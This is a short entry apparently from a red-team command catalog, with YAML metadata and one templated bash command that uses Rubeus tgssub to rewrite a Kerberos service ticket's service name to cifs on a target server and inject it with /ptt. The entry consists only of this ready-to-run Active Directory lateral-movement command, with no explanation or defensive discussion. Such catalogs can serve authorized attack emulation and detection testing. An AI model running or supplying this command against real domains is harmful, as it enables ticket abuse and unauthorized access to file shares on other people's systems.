---
id: a8f0730a-e2b2-4c76-87a5-3c5a0b5adb43
name: Modify TGS ciphered data using Rubeus tgssub command
type: command
executor: bash
data: Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
output: null
created_at: '2023-04-06T03:56:07.821645+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
---

# Modify TGS ciphered data using Rubeus tgssub command

```bash
Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
```
